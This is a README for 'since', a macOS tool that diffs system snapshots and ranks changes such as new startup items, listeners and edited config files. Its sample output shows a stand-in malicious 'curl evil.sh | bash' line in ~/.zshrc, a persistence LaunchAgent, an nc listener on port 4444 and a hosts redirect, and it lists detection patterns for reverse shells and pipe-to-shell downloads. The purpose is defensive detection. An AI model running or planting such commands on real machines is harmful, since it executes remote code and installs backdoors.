# since

**A plain-language daily diff of your computer.** One command that answers:

> *What's different about my machine since I last looked?*

`since` snapshots the things that quietly change under you, then shows you the delta
in human language — **ranked by how much you should care**, with *why* each change
probably happened and the command to undo it. Great for catching **both** malware
persistence **and** your own forgotten `brew install` from three weeks ago.

```
since — what changed on this computer
baseline Thu 23 Jul 09:00  →  now Fri 24 Jul 09:00   (about 25 hours)

🚨 Worth a look — right now
  🔴 /etc/hosts (edited)
      why: redirects a real domain (hosts)
      +0.0.0.0 www.apple.com
  🔴 ~/.zshrc (edited)
      why: pipes a download straight into a shell
      +curl evil.sh | bash
  🔴 NEW startup/background jobs: ~/Library/LaunchAgents/com.evil.persist.plist
      signature: unsigned
      undo: launchctl bootout gui/$UID '…/com.evil.persist.plist'; rm '…'
  🟠 NEW listener: nc on port(s) 4444
  🟠 NEW login items: SketchyHelper
      undo: osascript -e 'tell application "System Events" to delete login item "SketchyHelper"'

Software
  + installed  fzf 0.54   (from: brew install fzf)
  ~ updated    jq 1.6 → 1.7

Disk — big new files
     1.4 GB  ~/Downloads/ubuntu.iso
```

## Severity, at a glance

Every change is ranked so real signal doesn't drown in routine noise:

| | Level | Examples |
|---|---|---|
| 🔴 | **critical** | unsigned startup item · new kernel extension · `curl \| bash` in a shell rc · a hosts-file redirect of a real domain |
| 🟠 | **notable** | new login item · new listening process · new browser extension · DNS/proxy change · edited system file |
| 🟡 | **minor** | a startup plist was modified · a persistence item was removed |
| ⚪ | **info** | software upgrades/removals · big new files |

## What it watches

- **Persistence** — login items, LaunchAgents/Daemons (new *or modified*), kernel
  extensions, system extensions, browser extensions.
- **Network** — listening services (keyed by process), DNS servers & proxy settings.
  Outbound connections are tracked too but hidden by default (`--all`) — they're too
  churny to be a daily signal.
- **Software** — Homebrew, npm-global, pip, `/Applications`, Mac App Store.
- **System files** — shell rc files, `/etc/hosts`, cron, `sshd_config`, `sudoers`,
  `~/.ssh/*`, and more — shown as an actual **line-level diff**.
- **Disk** — biggest new files and fastest-growing folders in your visible locations.

## Smart bits

- **Signing/trust check** — new startup programs & apps are run through `codesign`/
  `spctl`; an *unsigned* one gets bumped to 🔴.
- **Attribution ("why")** — correlates a new package with your shell history, so you
  see *"fzf — from: `brew install fzf`"* instead of an anonymous list.
- **Undo hints** — the reversal command for anything reversible it flags.
- **Malicious-pattern detection** — recognises `curl|bash`, base64-pipe-to-shell,
  netcat reverse shells, and hosts redirects, and escalates them to 🔴.

## Install

```sh
./install.sh
```

Symlinks `since` into `~/.local/bin` and offers a daily LaunchAgent that runs
`since digest --notify` each morning — a **desktop notification** whenever something's
worth a look. (Make sure `~/.local/bin` is on your `PATH`.)

## Commands

```sh
since                    # diff vs the most recent snapshot, then save one
since --since 1d         # by duration
since --since yesterday  # or natural language: "monday", "3 hours ago", "a week ago"
since --since clean      # or a named checkpoint (see `mark`)
since --all              # also show the noisy outbound-connection churn

since mark clean-slate   # save a named checkpoint of right now
since ack                # mark current state as normal — start fresh from here
since ignore 'listening:com.docker*'   # stop alerting on known-noisy things
since ignore --list

since snapshot           # capture only (what the daily job runs)
since digest --notify    # diff + desktop notification if 🟠 or worse
since list               # list saved snapshots (labels shown)
since --json             # machine-readable, with a max_level field
```

**First run** establishes a baseline. Run it again later to see the diff.

## Noise control

- **Listening services are keyed by process, not port** — daemons that rebind random
  high ports every boot won't cry wolf. A *new listening process* is the signal.
- **Big-file scan skips hidden/app-data dirs** (`~/Library`, `.git`, VM disks, LLM
  transcripts…) — it looks where *you* put files. Stated in the output, not hidden.
- **`ignore` rules** and **`ack`** let the digest get quieter and more meaningful over time.

## Design & internals

Zero dependencies (Python 3 stdlib + OS tools), no sudo. Each snapshot is a JSON
fingerprint per category; a diff is added/removed/changed keys, enriched with severity,
signing, attribution and undo. Collectors are **platform-abstracted** — a common schema
fed by per-OS backends.

Your snapshots stay private in `~/.local/state/since/` (mode `600`), never in this repo.
They describe your machine — treat them as sensitive.

## Platform support

- **macOS** — fully supported and verified.
- **Linux** — the collector layer is abstracted for it, but Linux backends (systemd,
  apt/dnf/pacman, `ss`, `~/.config/autostart`, `notify-send`) are **not implemented yet**;
  they'll be added and verified on a real Linux box. See `PENDING.md`. On Linux today it
  degrades gracefully (a couple of shared collectors, no crash).

## Limitations (honest ones)

- Login items use the `System Events` "Open at Login" list; the full Background Task
  Management DB (`sfltool dumpbtm`) needs `sudo` and isn't read yet.
- Only TCP listeners are tracked (not UDP). New ports on an already-known process aren't flagged.
- Signing check covers startup programs & apps, not live listeners (the process may differ by diff time).
- The big-file scan is bounded (visible dirs, `> 25 MB`) — not a full disk audit.

Not a replacement for real EDR/antivirus — a **friendly daily awareness tool** that makes
silent changes visible.
